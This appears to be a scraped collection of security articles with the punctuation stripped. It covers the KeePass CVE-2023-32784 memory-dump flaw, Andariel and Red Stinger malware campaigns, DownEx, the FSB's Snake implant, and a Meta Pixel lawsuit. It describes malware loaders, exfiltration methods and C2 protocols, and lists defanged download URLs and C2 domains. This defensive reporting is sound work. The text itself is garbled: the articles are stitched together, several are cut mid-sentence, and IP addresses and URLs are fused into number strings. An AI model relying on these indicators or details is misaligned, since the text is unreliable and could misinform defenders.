can be theprocess dump swap file pagefilesys hibernation file hiberfilsys or RAM dumpof the entire systemIt doesn't matter whether or not the workspace is lockedThe flaw exists because the software uses a custom password entry box named SecureTextBoxEx which leaves traces of each character the user types in the memoryKeePass 2X uses a custom-developed text box for password entry SecureTextBoxEx This text box is not only used for the master password entry but in other places in KeePass as well like password edit boxes so the attack can also be used to recover their contents explains vdohneyThe vulnerability impacts the latest version of KeePass 2531 and as the program is open-source any project forks are likely affectedKeePass 1X KeePassXC and Strongbox do not appear to be impacted by CVE-2023-32784 according to the developer of the password dumping toolAlso while the PoC was tested on Windows the exploit should also work for Linux and macOS with some modifications as the problem isn't specific to the OS but how KeePass handles user inputSince memory dumps must be retrieved for the KeePass master password to be recovered the exploitation of CVE-2023-32784 requires physical access or malware infection on the target machineHowever information-stealing malware could quickly check if KeePass exists on a computer or is running and if so dump the program's memory and send it and the KeePass database back to the attacker for offline retrieval of the cleartext password from the memory dumpBleepingComputer tested vdohney's 'keepass-password-dumper' tool by installing KeePass on a test device and creating a new database with the master password 'password123' as shown belowWe then locked our KeePass workspace which prevents access to it unless you enter the master password againIn our tests you can use Process Explorer to dump the memory of the KeePass project but it requires a full memory dump and not a minidump to work correctly No elevated privileges are needed to dump the processes' memoryAfter compiling vdohney's tool using Visual Studio we executed it against our memory dump and it quickly recovered most of our cleartext password with just the first two letters missingWhile this is not the complete password determining what characters are missing would be fairly easyThe researcher also warns that master passwords used in the past can remain in memory so they can be retrieved even if KeePass is no longer running on the breached computerThe developer of KeePass Dominik Reichl received the bug report and promised to roll out a fix for CVE-2023-32784 on version 254 expected sometime in July 2023However Reichl told BleepingComputer that KeePass version 254 is more likely to be released to users in about two weeks so it should be out by early JuneKeePass 254 for Windows will have both while macOS and Linux versions will only get the second enhancementThe creator of the PoC has confirmed that he can no longer reproduce the attack with the two security enhancements in place so the fix appears to be effectiveEven after the new version is released the master password may still be stored in memory files The researcher warns thatto be 100 safe that it is not lurking on the system you would need to delete your system's swap and hibernation files format your hard drive using the overwrite data mode to prevent data recovery and do a fresh OS installFor most though restarting the computer clearing your swap file and hibernation files and not using KeePass until the new version is released are reasonable safety measures for the time beingEven then for the best protection be super vigilant about not downloading programs from untrusted sites and beware of phishing attacks that may infect your devices giving threat actors remote access to your device and your KeePass database"

        "text": "--ListenShareSince 2020 DCSO has been monitoring a publicly undocumented malware family attributed to the Andariel group a subgroup of the infamous North Korean Lazarus Group The malware family has remained largely unchanged over the years and only made few appearancesIn early 2023 however one such appearance seemed particularly noteworthy as the configured Command Control suggests that the attackers have managed to compromise the web presence of the National Institute of Virology in India and possibly used it to control computers infected with the malware familyIn this blog post we document the malware and discuss how this finding fits the attacker profileWe then added custom rules for this family to our monitoring Around a year later the rule produced another hit the OSPREY sample based on its code signature by OSPREY VIDEO INC which we could attribute to a targeted attack attempt against a German medicalpharma companyAnalysis of the CISA sample revealed it to likely be older with the timestamps dating it to 2021 the same year as the OSPREY sample Then a few weeks later our monitoring finally detected another sample and this time it appeared to be a fresh catch too with timestamps indicating a compile time in mid January 2023At the time of finding the sample we were unable to receive actual commands from the configured C2 so it remains inconclusive if the compromise took place However the configured path does closely resemble another path that we believe was used by the real web page at some point further indicating that a compromise took place and was intentionally chosen to blend inFor similar attacks it is also documented that commands are closely guarded and only issued to requests coming from expected source IPs typically returning 404 for anyone else in order to keep a low profileSo while we do not have definite proof of a compromise DPRK actors targeting the NIV either as the intended target or in order to attack other targets in the general nexus of the NIV such as other medical companies would fit the attacker profile very wellThe Command Control projectcellnivcoin resolves to 1732493380 which is allocated to German mass-hosting provider Contabo GmbH No other FQDNs have been seen on this IP address thus farIt remains unclear at the time of writing why IKF chose to host at least some of their customers infrastructure in Germany far away in both geographic and network terms from their presumed main audience in the India vicinityFurther IKFs nameserver setup struck us as odd with the primary nameserver serving nivcoin and others nsiknowledgefactorycom resolving to 1037318976 allocated to Evoke Digital Solutions in India while having its PTR DNS record set to emaillkfin This domain note the similarity of l and i however is currently available for sale and does not seem to be under control of IKF anymoreLastly it has to be noted that the official website of the National Institute of Virology is nivicmrorgin a fact also advertised on nivcoin which appears to have been abandoned by NIV or IKF commencing October 2022 Rather than letting previously used domains orphan or even expire it is crucial to set up proper redirects to the new primary domain and ensure the respective organization maintains control over its domain set all the timeThe malware itself is a basic loader It can download files execute shell commands and send back the console outputCommunication happens via HTTP which is manually implemented using socket functions and as such it is not capable of communicating with HTTPS serversThe client transfers data via POST requests in which the data fields are encrypted using a simple rotating xor base64Weve identified the following fieldsThe page field contains basic client info such as10001DESKTOP-BI961TXbatman11064where the first field is a collection of local IP addresses followed by the computer name username Windows version as well as bitness of the systemThe server then responds either with HTTP 504 which signals the bot to stop running or HTTP 500 which may contain a command andor download payload in the HTTP bodyIn case of HTTP 500 shell command andor download task the HTTP body adheres to the following formatAll fields following the xor key are encrypted with it using a simple rolling xor schemeThe check string appears to be a magic 8 byte value the client verifies with a simple algorithm which is satisfied by the following magic bytesExample code of the check algorithm in PythonBased on this weve created a Suricata rule which were distributing as part of the IoCsIf a download target path is specified in the response the malware will write the payload to the specified path and copy Explorerexes timestamps to it in order to disguise the file In case the downloaded file is an EXE file it will also pad the executable with 40000000 40MB random bytes on disk likely to exceed some security softwares file limits andor generate a unique hashsum for downloaded binariesIf a shell command is specified the malware will execute the shell command capture the output and send the contents back to the C2 using the rep0 POST request field----We are DCSO

        "text": "In whats become a contentious issue over the last year Meta is placing the blame of alleged hospital data scraping squarely on the shoulders of the healthcare providers that deployed the Pixel analytics tools on their websites without considering the possible third-party data sharingA motion to dismiss filed in a federal California court late last week said the individuals who brought the class action lawsuit against Facebook accusing the social media giant of collecting hospital website data and violating the medical privacy of millions of patients are missing the pointIts ultimately the developer not Meta that controls the code on its own website and chooses what information to send according to the May 5 filing The lawsuit attempts to distract the court from these points by detailing the ways in which Meta allegedly encourages businesses in the healthcare sector to use its business toolsCompanies can use the Pixel tool without sending health data to Meta and are expected to use the tool in compliance within Metas terms the company argues The company also claims to use filtering tools that screens out health data and alerts the developer so they can check configurations of the Pixel and fix any issues There's nothing inherently unlawful or harmful about the technology at the heart of this case Meta claimsThe grab-bag complaint that alleges 13 causes of action ranging from wiretap violations to larceny to trespass dont fit the narrative of their claims Namely that its Meta that should be held liable for certain healthcare providers alleged misuse of a publicly available toolIn short Meta did not implement or configure Pixels on the providers websites Thus their arguments squarely centered on Metas intent to gather health data fail and are poor vessels for the misguided theory posed by the individualsThe filing is a sharp rebuttal to a year-long railing against Meta for the manner in which its Pixel tool has allegedly enabled the inadvertent sharing of health data to third-party companies by the hospitals and healthcare providers that used the tools to better understand the needs of their usersFiled in June 2021 the lawsuit claims Meta knowingly receives patient data including patient portal usage information from hundreds of medical providers in the US that have deployed the Facebook Pixel on their web properties The data is then allegedly monetized by the company by generating highly-profitable targeted advertising on- and off-FacebookThe Department of Health and Human Services has already warned providers that Pixel use without a business associate agreement violates the Health Insurance Portability and Accountability Act The use of these tools pose a serious violation of patient privacy particularly in instances that lead to targeted advertising for specific health conditionsKaiser Permanente is the latest healthcare provider to be sued by a patient for its alleged use of tracking tools The massive health system has not issued a breach notice tied to Pixel use But the May 5 lawsuit claims the installed code shares patients health data with Quantum Metric Twitter Adobe Bing and GoogleThe data allegedly shared with these third parties includes identifying information medical topics researched choices made information shared and communications with their medical providers including personally identifiable medical information and other confidential information and communications when that information is in transitMuch like the Meta class action suit the lawsuit language also includes references to wiretappingAs such the courts forthcoming decision on Metas motion to dismiss could have serious impacts on dozens of lawsuits filed against Meta Google and the healthcare providers that

        "text": "PersonalFind the right productInfected already Business PricingProtect your personal devices and dataProtect your teams devices and dataExplore our award-winning endpoint security products from EP to EDR to MDR Partners Resources SupportThis blog post was authored by Malwarebytes Roberto Santos and Fortinets Hossein JaziWhile the official conflict between Russia and Ukraine began in February 2022 there is a long history of physical conflict between the two nations including the 2014 annexation of Crimea by Russia and when the regions of Donetsk and Luhansk declared themselves independent from Ukraine and came under Russias umbrella Given this context it would not be surprising that the cybersecurity landscape between these two countries has also been tenseWhile looking for activities from the usual suspects one of our former coworkers at Malwarebytes Threat Intelligence Team discovered a new interesting lure that targeted the Eastern Ukraine region and reported that finding to the public Moreover we started tracking the actor behind it which we internally codenamed Red StingerOur investigation could be helpful to the community as we will provide new undisclosed data about the group We have identified attacks from the group starting in 2020 meaning that they have remained under the radar for at least three years Additionally we will provide insights into the latest campaigns performed by Red Stinger where we have found that the group has targeted entities in different places of UkraineMilitary transportation and critical infrastructure were some of the entities being targeted as well as some involved in the September East Ukraine referendums Depending on the campaign attackers managed to exfiltrate snapshots USB drives keyboard strokes and microphone recordingsFinally we will reveal unknown scripts and malware run by the group in this reportIn fact this is the attack that Kaspersky analyzed inits blog However this was not the only activity carried out by the group Malwarebytes has identified multiple operations first dated in 2020 The next infographic shows some of the operations recognized by usOperations performed by Red StingerSince our investigation started in September 2022 information about the initialcampaigns has been limited However the actors tactics techniques and procedures TTPs are very distinctive which gives us a high level of confidence in our attributionThe first operation we know of happened in December 2020 Although the infection chain is similar to what was already reported the attackers were using a slightly different process back in 2020An MSI fileis downloaded from hxxp9123433185f8f44e5de5b4d954a83961e8990af655updatemsi This first MSI file when executed will show the following error to the userIn the background this MSI file will execute a vbs file that runs a dll file The content is encoded using base64So finally cachelibdll will be executed That file will droptwo files named iesyncso and iesyncvbsAfter that the iesyncvbs file will apply a XOR operation to iesyncso After applying that conversion to the file we can see that this file is what we called DBoxShell also called PowerMagic by KasperskyA valid translation of this document would beRESOLUTIONdated March 25 2021 No 584-NSLuganskOn consideration in the second reading of the draft lawof the Luhansk Peoples Republic dated March 19 2021 No 417-PZ 21-3On Amendments to the Law of the Luhansk Peoples RepublicOn physical culture and sports 583-zip contains a lnk file as well as the previous pdf This lnk file will download an MSI file from the url hxxp9123433108u3ebe9c1f5e5011f667ef8990bf22a38f7documentmsi and from there the attack is pretty similar as the one performed in OP1 Just a few differences to note for example in this case the dll used is named libsysdllAlso as the image shows paths used the folder winappstorepackage or WinStoreApps instead of CacheWidgets that was used in OP1 Also the powershell script is slightly different in this caseNevertheless the infection phase finally used DBoxShell as beforeWe have very little information about this operation but based on the TTPs we have identified overlapping techniques with both previous and subsequent attacksMSI files usage is a known signature from the group Also the MSI file was downloaded from hxxp18523090163df07ac84fb9f6323c66036e86ad9a5f0d118734453342257f7a2d063bf69e39dattachmentmsi Note the common pattern in urls18523090163 belongs to ASN number 56485 All IPs used from 2020 till now belong to the same ASNVT telemetry showed common patterns with OP2After the war began we collected information about two distinct operationsOP4 is perhaps one of the most interesting attacks performed by the group As you can see in the following lines this attack still has some characteristics that led us to attribute it to Red Stinger Furthermore the attack has some unique features that make it stand out as one of the most interesting onesIn this case the group used hxxp176114919211535685AB69DB9E1191E9375E165attachmentmsi to download the malicious MSI file Note once more this common pattern in all URLs used by the group This MSI file contained a PDF a vbs file and a dat fileThe group followed a similar infection chain as in previous operations Finally a vbs file was responsible for XORing and executing a dat file which contained a small loader and a variant of DBoxShellDBoxShell is malware that utilizes cloud storage services as a command and control CC mechanism This stage serves as an entry point for the attackers enabling them to assess whether the targets are interesting or not meaning that in this phase they will use different toolsA better look of how RedStinger operates can be seen in the next infographicCommon pattern in Red Stinger operationsAfter the infection phase we are aware that actors dropped at least the following artifactsIn the reconnaissance phase we noticed the execution of 2 MSIfiles named SolarToolsmsi and Solarmsi Both had inside tools named ngrokexe and rsockstunexeRsockstun is a tool that allows attackers to route connections through external proxiesMore important we have seen the same version of Solarmsi 02f84533a86fd2d689e92766b1ccf613 on OP4 and OP5 allowing us to connect the dots between thesetwo attacksIn addition to SolarTools starting the exfiltration phase we also found another file named vssecpackmsi This file contains two files ntinitexe and ntuserdat which will be located under cProgramDataNativeApp Ntinitexeis a file that was developed as a Windows Service named ntmscmInside that service eventually a thread will be executed This thread contains all the functionality Its main purpose is to execute one of the binaries hidden inside ntuserdat after some parsing Also it will execute CProgramDatauserdat if foundNtuserdat is an aggregation of PE files with a leading header and a final chunk These executables are xored each one with a different value The next image shows the headerThis header can be seen as a C structure defined like thisstruct headFirstChunk DWORD signature DWORD osInstallDate int sizeMz1 int sizeMz2 int sizeMz3 int sizeMz4 int sizeConfig DWORD xorValsMZ1 DWORD xorValsMZ2 DWORD xorValsMZ3 DWORD xorValsMZ4Following this header four PE files are stored consecutively and XORed As the previous structure shows the size and XOR value used to decode these files can be recovered from the headerWe wont analyze all MZs one by one as we want to avoid overwhelming the reader with technical details that are out of scope For a quick reference the first MZ was a copy of ntinitexe and the second was a dll capable of injecting files using the Process Doppelganging technique Curiously InjectorTransactedHollowdll string was found inside the binary so possibly that was how attackers named the file originallyThe third was also used for injection purposes The fourth was the most interesting because it communicates with a new Dropbox account Some of these will be injected or used to inject MZs into legitimate process mobisyncexeFinally the last chunk of ntuserdat was a configuration file The configuration was encrypted and looked like thisThat configuration was encrypted using AES The IV is the first 16 bytes of the config The key can be recovered from the fourth MZ In fact this executable will use this configuration to communicate with DropboxDecrypted configuration is shown nextThis configuration is pretty representative of the groups motivation First of all we see a new Dropbox account being used This Dropbox account will be used to gather exfiltrated victims data It can be seen like the exfiltration phase starts here Note that attackers will use one account for reconnaissance and a different one for exfiltrationThe object field was also revealing It contained a Russian name redacted for privacy followed by the DNR letters probably Donetskaya Narodnaya Respublika referring to one of the cities declared independent in 2014 and a known target to the group Victimology will be discussed laterOP5 was the last known activity we will cover As Kaspersky already revealed some technical details about this operation we wont repeat that analysis again A link to the analysis made by them can be found at the beginning of this reportWhat we can do here is provide some extra insights regarding the attack Lets start at the Reconnaissance phase Reconnaissance phase starts right after DBoxShell GraphShell is executed This is the GraphShell version used in OP5The way GrapShell works is pretty simple and also can be almost guessed by viewing the image A folder tree is createdRoot AmazonStore clients tasksresultsAnd as DBoxShell does clients will hold heartbeats from clients tasks will store tasks that will be executed at some point by victim systems and results will be uploaded to resultsAs we were actively

some of the tooling analyzed by Kaspersky the exfiltration phase startsAs this operation happened before our investigation started we cannot determine how many victims were infected However at the time we began monitoring we still had information about two victims Surprisingly these two victims were located in central Ukraine This is interesting because all the information had previously pointed to East Ukraine where the Donbass region is locatedOne of the victims was a military target but the activity on this target was only carried out for a few hours We have reason to believe that the user noticed something wrong and executed an antimalware solution shortly after being infected which likely detected and cleaned the systemAs far as we know attackers managed to exfiltrate on this target several screenshots microphone recordings and some office documentsThe other victim we found was located in Vinnitsya Target was an officer working in critical infrastructure Attackers made a great and long surveillance of this victim which extended until Jan 2023 They have exfiltrated screenshots microphone and office documents but also keystrokes were uploadedWith the victimology shared in OP4 we may think that this was a group targeting only UA-aligned entities However the analysis of OP5 revealed an interesting fact it mainly targeted RU-aligned entitiesTwo victims attacked in OP5 were workers at Yasinovataya Administration Donetsk Another victim was also part of DPR administration in Port Mariupol All of them were performing different activities regarding elections We also have found one victim holding the advisor position from CEC Central Election Commission According to Wikipedia The Central Election Commission of the Russian Federation Russian abbr also is the superior power body responsible for conducting federal elections and overseeing local elections in the Russian FederationCentral Election Commission of the Russian Federation CIK stampRegarding CEC we had seen another victim codenamed CIK03D502E0 CIK is also another term that could refer to CEC Attackers showed great interest in this one as this victim was one of the only ones with its own name some were just identified by using a drive ID Also USB drives from that victim were uploaded Next image shows a small fraction of filenames exfiltrated by the attackers To clarify TK probably stands for TEC Territorial Election CommisionReconnaissance phase also revealed some nice info DNS records obtained from another victim showed mailgorod-donetskorg popgorod-donetskorg which could suggest that the victim was part of DPR administrationFrom that same victim those DNS records revealed connections against xn--j1abxn--b1adbccegehv4ahbyd6o2cxn--p1ai translate Revival Leaders That website was created in behalf of Putin and is a contest to find potential leaders and fill out positions at Kherson Zaporozhye DPR and Lugansk It is unclear which positions will be filled by that but winners were promised to get 1000000 rubles for a personally chosen training program in the Russian FederationIn addition to the victims involved in the September referendums we also identified two other victims that did not seem to be related to the elections One of them appeared to be related to the transportation ministry or equivalent codenamed by the attackers as ZhdDor which could be translated as railroad We also found additional data that suggested that the attackers could be interested in transportationFurthermore we discovered that a library in Vinnitsya was infected in OP5 Although this victim was UA-aligned we do not understand why it was a target especially since it was the only UA entity targeted in OP5 However it is worth noting that in OP4 an entity located in Vinnitsya was also targetedFinally we have 2 victims named TstSCR and TstVM It turns out that attackers at some point infected their own machines in order to carry out some testing or by mistakeThis first image is a good example of that First of all we noticed that the keyboard language was set to ENG which is unexpected This may suggest that the group was composed of native English speakers However we find it strange because of the way they named the project folder internetWORK We cannot be certain but we believe that no native speaker would use that naming conventionThis second image is also nice to show As you may notice this is the source code of the file Overallexe reported by researchers while being debugged Also some of the victim folders we named in this report are shown as part of the sourcesFor the account TstVM we choose this screenshot In this case attackers were developing a tool they use to tunnel victim communications It can be seen redacted how source code reveals external IP addresses used by them as some internal ones naming for machines that we have not redacted and even passwordsAnalysis of these machines also revealed the usage of the application AdvOr used for tunneling communications through TORIn this case attributing the attack to a specific country is not an easy task Any of the involved countries or aligned groups could be responsible as some victims were aligned with Russia and others were aligned with UkraineWhat is clear is that the principal motive of the attack was surveillance and data gathering The attackers used different layers of protection had an extensive toolset for their victims and the attack was clearly targeted at specific entities Perhaps in the future further events or additional activity from the group can shed light

        "text": "May 10 2023 By sharing this information we hope to raise awareness about the current threat landscape and help public and private organizations to protect themselvesThe domain and IP addresses involved do not appear in any previously documented incidents and the malware does not share any code similarities with previously known malicious software Since this appears to be a new malware family we named it DownExBy analyzing indirect indicators such as the specific targets of the attacks the document metadata impersonating a real diplomat and the primary focus being on data exfiltration we can make an educated guess that a state-sponsored group is responsible for these incidents Despite trying various methods we have been unable to attribute these attacks to a specific threat actor One clue pointing at the origin of the attack is the use of a cracked version of Microsoft Office 2016 popular in Russian-speaking countries known as SPecialisST RePack or Russian RePack by SPecialiST It is also unusual to see the same backdoor written in two languages - this practice was previously observed with group APT28 Russian-based with their backdoor Zebrocy Based on a combination of indicators we are attributing this campaign to a group associated with Russia albeit with low confidenceWhile the initial infection vector remains unclear we expect that threat actors used social engineering techniques to deliver a spear-phishing email with a malicious payload The attack used a simple technique of using an icon file associated with docx files to masquerade an executable file as a Microsoft Word document The attachment file did not use double-extension commonly detected as a suspicious practice and was simply named to redacted embassy kazakh 2022exe Unfortunately it seems that email remains an effective route for delivering malicious payloads in 2023This executable is a self-contained loader After executing this attachment two files are extracted to disk and executedThe extracted Word document is a simple disguise and designed as a way for the attacker to not raise suspicion while the malicious script ran in the backgroundFig 1 The extracted Word document is inconspicuous and seemed to be designed only as a way for the attacker to not raise suspicion while the malicious script ran in the backgroundThe second file log is extension-less HTA file normally hta with embedded VBScript code HTA stands for HTML Application and it is a file type that contains VBscript HTML CSS or JavaScript code that can be executed as a standalone application on a Windows operating system HTA was a popular method for sysadmins to add basic user interface to their scripts or create simple utility programsThe download of the next stage failed and we have not been able to retrieve the payload from the command and control C2 server Based on our analysis of similar attacks we expect threat actors tried to download backdoor to establish persistenceSeveral other tools located on the victims machine were used to establish connection to the C2 server In the next section we document our analysis of these tools and scriptsTo establish communication loop with the C2 infrastructure threat actors deployed Python-based backdoor helppy located in the folder CProgramDatapythontoolsscripts The threat actors took an extra effort to make this script hard to analyze The script was protected by PyArmor a Python obfuscation tool that can help protect scripts from reverse engineering and tampering We were able to retrieve the corresponding Pytransformpyd module This compiled module basically a DLL file used by Python script was protected by the Themida software protection tool and multiple obfuscation techniques including opcode mixing have been usedThrough considerable effort we were able to analyze this script and reverse engineer the C2 communication protocol and the structure of the scriptThe C2 can respond with specific tasks to perform on compromised machine The task contains following valuesThe tasks are represented by a Python class having the form class Anumber During our monitoring we have observed the 4 distinct tasks but we are confident there are more task typesAfter victim finish processing the tasks it communicates back to the C2 server using the following JSON structureIt is important to mention that nothing prevents threat actors from delivering Python code directly instead of using class constructsDuring our investigation we have identified multiple samples of new malware written in C The executable diagsvcexe was stored in folder CProgramDataPrograms and is designed for files exfiltrationFig 2 Different approaches to establishing the C2 connectionOne of the samples included a PDB string CProjectsDOWNReleaseDOWNpdb PDB Program DataBase is a file format used by Microsoft Visual Studio for storing debugging information about an executable or DLL file We decided to call this malware

strings encrypted with a simple XOR cipher One simple MD5ae5d4b9c1038f6840b563c868692f2aa did not exfiltrate data by contacting the C2 server directly instead it created and executed a VBScript

drives and collects the files with the following extensionsThreat actors are interested in confidential files like pgp or pem files but also in financial data such as QuickBooks log files tlg extensionAfter the files are collected they are exfiltrated using a password-protected zip archive Size of uncompressed data is limited to 30 MBs for each archive If needed multiple archive files are generated To limit the size of exfiltrated files DownEx stores checksums of already exfiltrated files CRC to avoid duplication The archives are exfiltrated to the C2 server by making POST request to

considered the most sophisticated cyber espionage tool designed and used by Center 16 of Russias Federal Security Service FSB for long-term intelligence collection on sensitive targets To conduct operations using this tool the FSB created a covert peer-to-peer P2P network of numerous Snake-infected computers worldwide Many systems in this P2P network serve as relay nodes which route disguised operational traffic to and from Snake implants on the FSBs ultimate targets Snakes custom communications protocols employ encryption and fragmentation for confidentiality and are designed to hamper detection and collection effortsWe have identified Snake infrastructure in over 50 countries across North America South America Europe Africa Asia and Australia to include the United States and Russia itself Although Snake uses infrastructure across all industries its targeting is purposeful and tactical in nature Globally the FSB has used Snake to collect sensitive intelligence from high-priority targets such as government networks research facilities and journalists As one example FSB actors used Snake to access and exfiltrate sensitive international relations documents as well as other diplomatic communications from a victim in a North Atlantic Treaty Organization NATO country Within the United States the FSB has victimized industries including education small businesses and media organizations as well as critical infrastructure sectors including government facilities financial services critical manufacturing and communicationsDownload the PDF version of this reportWe consider Snake to be the most sophisticated cyber espionage tool in the FSBs arsenal The sophistication of Snake stems from three principal areas First Snake employs means to achieve a rare level of stealth in its host components and network communications Second Snakes internal technical architecture allows for easy incorporation of new or replacement components This design also facilitates the development and interoperability of Snake instances running on different host operating systems We have observed interoperable Snake implants for Windows MacOS and Linux operating systems Lastly Snake demonstrates careful software engineering design and implementation with the implant containing surprisingly few bugs given its complexityFollowing open source reporting by cybersecurity and threat intelligence companies on Snake tactics techniques and procedures TTPs the FSB implemented new techniques to evade detection The modifications to the implant enhanced challenges in identifying and collecting Snake and related artifacts directly hampering detection from both host- and network-based defensive toolsThe effectiveness of this type of cyber espionage implant depends entirely on its long-term stealth since the objective of an extended espionage operation involves remaining on the target for months or years to provide consistent access to important intelligence The uniquely sophisticated aspects of Snake represent significant effort by the FSB over many years to enable this type of covert accessThe FSB began developing Snake as Uroburos in late 2003 Development of the initial versions of the implant appeared to be completed around early 2004 with cyber operations first conducted using the implant shortly thereafter The name Uroburos is appropriate as the FSB cycled it through nearly constant stages of upgrade and redevelopment even after public disclosures instead of abandoning it The name appears throughout early versions of the code and the FSB developers also left other unique strings including Ur0bUrsGoTyOu which have publicly come back to haunt themUnique features in early versions of Uroburos included a low resolution image of a portion of a historical illustration of an uroboros by the German philosopher and theologian Jakob Bhme One approach to a tertiary backdoor used this image as the key The same image had also been embedded in other Snake-related components The image blown up to a higher resolution is shown belowIn addition early FSB developers of the Snake implant left portions of unique code throughout the implant which reveal inside jokes personal interests and taunts directed at security researchers For instance the Ur0bUrsGoTyOu string referenced above was replaced with gLASs D1cK in 2014 following some of the public cybersecurity reportingWe attribute Snake operations to a known unit within Center 16 of the FSB This unit more broadly operates the numerous elements of the Turla toolset and has subunits spread throughout Russia in a reflection of historical KGB signals intelligence operations in the Soviet Union Snake has been a core component of this units operations for almost as long as Center 16 has been part of the FSB The extensive influence of Snake across the Turla toolset demonstrates its impact on practically every aspect of the units modern era of cyber operationsDaily operations using Snake have been carried out from an FSB facility in Ryazan Russia with an increase in Snake activity during FSB working hours in Ryazan approximately 700 AM to 800 PM Moscow Standard Time GMT3 The main developers were Ryazan-based FSB officers known by monikers included in the code of some versions of Snake In addition to developing Snake Ryazan-based FSB officers used it to conduct worldwide operations these operations were different from others launched from Moscow or other FSB sites based on infrastructure and techniquesWhile the development and re-tooling of Snake has historically been done by Ryazan-based FSB officers Snake operations were also launched from an FSB Center 16-occupied building in Moscow Our investigations have identified examples of FSB operators using Snake to its full potential as well as FSB operators who appeared to be unfamiliar with Snakes more advanced capabilities These observations serve to illustrate the difficulty in using such an advanced toolset across the various geographically dispersed teams comprising this unit within FSB Center 16We have been collectively investigating Snake and Snake-related tools for almost 20 years as well as other operations by this unit since the 1990s During that time the FSB has used Snake in many different operations and they have demonstrated the value placed in this tool by making numerous adjustments and revisions to keep it viable after repeated public disclosures and other mitigations Snakes code and multiple Snake-related tools have been either a starting point or a key influence factor for a diverse range of other highly prolific implants and operational tools in the Turla family Most notably this has included Carbon aka Cobraderived from Snakes code baseand the similarly Snake-adjacent implant Chinch currently known in open sources as ComRATWe have identified Snake infrastructure in over 50 countries across North America South America Europe Africa Asia and Australia to include the United States and Russia itself Although Snake leverages infrastructure across all industries its targeting is purposeful and tactical in nature For instance if an infected system did not respond to Snake communications the FSB actors would strategically re-infect it within days Globally the FSB has used Snake to collect sensitive intelligence from high priority targets such as government networks research facilities and journalists As one example FSB actors used Snake to access and exfiltrate sensitive international relations documents as well as other diplomatic communications from a victim in a NATO country Within the United States the FSB has victimized industries including education small businesses and media organizations as well as critical infrastructure sectors including government facilities financial services critical manufacturing and communicationsThe FSB typically deploys Snake to external-facing infrastructure nodes on a network and from there uses other tools and TTPs on the internal network to conduct additional exploitation operations Upon gaining and cementing ingress into a target network the FSB typically enumerates the network and works to obtain administrator credentials and access domain controllers A wide array of mechanisms has been employed to gather user and administrator credentials in order to expand laterally across the network to include keyloggers network sniffers and open source toolsTypically after FSB operators map out a network and obtain administrator credentials for various domains in the network regular collection operations begin In most instances with Snake further heavyweight implants are not deployed and they rely on credentials and lightweight remote-access tools internally within a network FSB operators sometimes deploy a small remote reverse shell along with Snake to enable interactive operations This triggerable reverse shell which the FSB has used for around 20 years can be used as a backup access vector or to maintain a minimal presence in a network and avoid detection while moving laterallySnakes architectural design reflects professional software engineering practices Critical pathways within the implant are made of stacks of loosely coupled components that implement well-designed interfaces In addition to facilitating software development and debugging this construction allows Snake to use multiple different components for the same purpose choosing the specific component based on environmental considerations For example Snakes custom network communications protocols function as a stack All implementations use an encryption layer and a transport layer such as Snakes custom HTTP or raw TCP socket protocol Each layer of the Snake network protocol stack solely implements a specified interface for operability with the two adjacent layers The encryption layer and underlying transport layer thus function independently so any custom Snake network protocol can employ an encryption overlay without any change to the encryption layer codeThis modularity allows Snake operators to choose the most logical network transport for the given environment without affecting Snakes other functionality When using a compromised HTTP server as part of the Snake P2P network the operators can ensure that all traffic to this machine follows the Snake custom HTTP protocol and thereby blends effectively with legitimate traffic In the context of a compromised machine that legitimately allows secure shell SSH connections Snake can utilize its custom raw TCP socket protocol instead of its custom HTTP protocol All other layers of the Snake protocol stack from the immediately adjacent transport encryption layer to the distant command processing layer can and do remain entirely agnostic to the transport layer as long as it implements its interface correctly This architecture also allows the Snake developers to easily substitute a new communications protocol when they believe one has been compromised without necessitating any downstream changes in the code base Lastly this design facilitates the development of fully interoperable Snake implants running on different host operating systemsSnakes technical sophistication extends from the software architecture into the lower-level software implementation Original versions of Snake were developed as early as 2003 before many of the modern programming languages and frameworks that facilitate this type of modular development were available Snake is written entirely in C which provides significant advantages in low-level control and efficiency but which does not provide direct support for objects or interfaces at the language level and provides no assistance with memory management The developers of Snake successfully implemented the implants complex design in C with very few bugs including careful avoidance of the common pitfalls associated with null-terminated strings and the mixing of signed and unsigned integers Additionally the developers demonstrate an understanding of computer science principles throughout the implants implementation This includes selecting and correctly coding asymptotically optimal algorithms designing and utilizing efficient custom encoding methodologies that closely resemble common encoding schemes and handling the numerous possible errors associated with systems-level programming in a secure mannerAlthough the Snake implant as a whole is a highly sophisticated espionage tool it does not escape human error A tool like Snake requires more familiarity and expertise to use correctly and in several instances Snake operators neglected to use it as designed Various mistakes in its development and operation provided us with a foothold into the inner workings of Snake and were key factors in the development of capabilities that have allowed for tracking Snake and the manipulation of its dataThe FSB used the OpenSSL library to handle its Diffie-Hellman key exchange The Diffie-Hellman key-set created by Snake during the key exchange is too short to be secure The FSB provided the function DHgenerateparameters with a prime length of only 128 bits which is inadequate for asymmetric key systems Also in some instances of what appeared to be rushed deployments of Snake the operators neglected to strip the Snake binary This led to the discovery of numerous function names cleartext strings and developer comments as seen in the following figureThe FSB has quickly adapted Snake when its capabilities have been publicly disclosed by private industry Snake therefore exists in several variants as it has evolved over almost 20 years This CSA focuses on one of the more recent variants of Snake that up until now has not been widely disclosed Older variants of Snake will be discussed briefly where applicable but not discussed in depth as many details of earlier Snake variants already exist in the public domainThe Snake installer has gone by various names throughout Snakes existence eg jpinstexe This advisory will describe the version of the installer which regularly used the name jpsetupexe This executable is packed using a customized obfuscation methodology The developers appear to have added the unpacking functionality from an open source project for viewing JPEG files This technique serves to obfuscate the unpacking code within an otherwise legitimate code base The unpacking code extracts an executable herein referred to as the Png Exe and it extracts an AES encrypted blob from the Png Exes resources which herein will be referred to as the Png ResourceThe jpsetupexe installer requires two arguments to be passed via the command line for execution The first argument is a wide character string hashed with SHA-256 twice and the resulting value of these computations becomes the AES key that decrypts the Png Resource The AES initialization vector IV consists of the first 16 bytes of the second argument to jpsetupexe after prepending the argument with a wide character 1 string Once decrypted the Png Resource becomes an executable that will be referred to herein as Stage 2When unpacked many components are extracted from Stage 2s resources Several of the resources are executables with additional resources of their own Stage 2 creates structures from its resources which ultimately become the host artifacts of SnakeAs Windows has been the most prevalent operating system targeted by Snake this document will only discuss the Windows-based artifacts however Snake can be cross-compiled and is capable of running on other operating systemsSnakes host architecture and network communications allow an unusual level of stealth Snake makes inventive use of its kernel module in both of these contexts All known Windows versions of Snake have used a concealed storage mechanism to hide host componentry In addition to using the kernel module to remove the relevant components from any listing returned by the operating system Snake utilizes the kernel module to mediate any requests between Snakes user mode components and the concealed storage mechanism which itself is encrypted with a unique per-implant key This unique keying creates detection 